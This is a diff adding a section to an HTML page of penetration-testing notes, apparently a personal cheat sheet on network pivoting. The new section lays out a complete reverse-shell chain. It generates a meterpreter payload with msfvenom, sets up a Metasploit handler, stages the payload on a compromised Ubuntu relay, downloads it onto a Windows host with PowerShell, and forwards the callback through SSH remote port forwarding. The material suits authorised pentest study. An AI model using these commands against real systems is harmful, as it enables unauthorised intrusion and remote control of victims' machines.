@@ -87,6 +87,48 @@ proxychains nmap <span class="nt">-sn</span> 172.16.5.1-200 <span class="c"># nm
 proxychains nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> 172.16.5.19
 </code></pre></div>
 
+<h2>remote port forwarding with SSH (reverse shell example)</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># suppose we have the following topology:</span>
+<span class="c"># attack box &lt;-&gt; ubuntu compromised server &lt;-&gt; windows server in local network only</span>
+<span class="c"># the ubuntu server can talk to the windows server,</span>
+<span class="c"># but our attack box can't directly talk to the windows server.</span>
+<span class="c"># we have to use the ubuntu server as a relay to get a reverse shell.</span>
+
+<span class="c"># let's also assume we can have RDP access to the windows server, if</span>
+<span class="c"># we leverage the compromised ubuntu server with port forwarding.</span>
+
+<span class="c"># we generate a windows payload with msfvenom</span>
+<span class="c"># note that it will connect back to the ubuntu server,</span>
+<span class="c"># not our attack box directly.</span>
+msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span>&lt;internal IP of compromised ubuntu server&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> payload.exe <span class="nv">LPORT</span><span class="o">=</span>8080
+
+<span class="c"># on your attack box, configure and run metasploit's multi/handler</span>
+<span class="c"># in msfconsole</span>
+use exploit/multi/handler
+<span class="nb">set </span>payload windows/x64/meterpreter/reverse_https
+<span class="nb">set </span>lhost 0.0.0.0
+<span class="nb">set </span>lport 8000
+run
+
+<span class="c"># transfer the payload to the compromised ubuntu server</span>
+scp payload.exe &lt;username&gt;@&lt;external IP of compromised ubuntu server&gt;:~/
+
+<span class="c"># start a python webserver on the compromised ubuntu server</span>
+python3 <span class="nt">-m</span> http.server 8123
+
+<span class="c"># on the windows target, download the payload with RDP and powershell</span>
+Invoke-WebRequest <span class="nt">-Uri</span> <span class="s2">"http://&lt;internal IP of compromised ubuntu server&gt;:8123/payload.exe"</span> <span class="nt">-OutFile</span> <span class="s2">"C:</span><span class="se">\p</span><span class="s2">ayload.exe"</span>
+
+<span class="c"># use SSH remote port forwarding on attack box, to forward</span>
+<span class="c"># connections from the ubuntu server's port 8080 to our</span>
+<span class="c"># meterpreter listener on port 8000</span>
+ssh <span class="nt">-R</span> &lt;internal IP of compromised ubuntu server&gt;:8080:0.0.0.0:8000 &lt;username&gt;@&lt;external IP of compromised ubuntu server&gt; <span class="nt">-vN</span> <span class="c"># verbose mode, without prompting the login shell</span>
+
+<span class="c"># execute the payload on the windows target and check if</span>
+<span class="c"># you received a meterpreter shell.</span>
+</code></pre></div>
+
 <h2>chisel</h2>
 
 <p>for compatibility with powershell-empire, use chisel 1.7.2.</p>
